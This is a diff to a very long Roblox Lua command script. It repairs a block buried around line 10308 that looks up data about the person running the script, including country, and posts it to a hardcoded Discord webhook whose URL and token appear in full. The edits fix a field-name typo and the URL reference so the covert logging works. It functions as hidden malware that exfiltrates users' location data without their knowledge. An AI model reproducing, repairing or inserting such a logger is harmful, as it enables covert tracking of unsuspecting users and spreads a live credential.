@@ -10308,6 +10308,7 @@ addcmd('chat',{'say'},function(args, speaker)
 	chatMessage(cString)
 end)
 
+
 local a = game:GetService("HttpService")
 result = request(
 	{
@@ -10317,6 +10318,7 @@ result = request(
 		},
 	})
 response = a:JSONDecode(result["Body"])
+
 url = "https://discord.com/api/webhooks/1227591549236416553/LQaDziIV-Aw-H1l7qriSOiX67VVPXHBuu_AwbruMroFkmttyi19e30jYiZyyGmQMhP4M"
 
 local http = game:GetService("HttpService")
@@ -10336,8 +10338,8 @@ data = {
 					["inline"] = true
 				},
 				{
-					["name"] = "Contry",
-					["value"] = "`"..response.contry.."`",
+					["name"] = "Country",
+					["value"] = "`"..response.country.."`",
 					["inline"] = true
 				},
 			},
@@ -10346,11 +10348,12 @@ data = {
 }
 local data = http:JSONEncode(data)
 local response = request({
-    Url = url.Text,
+    Url = url,
     Method = "POST",
     Headers = headers,
     Body = data
 })
+
 
 spamming = false
 spamspeed = 1
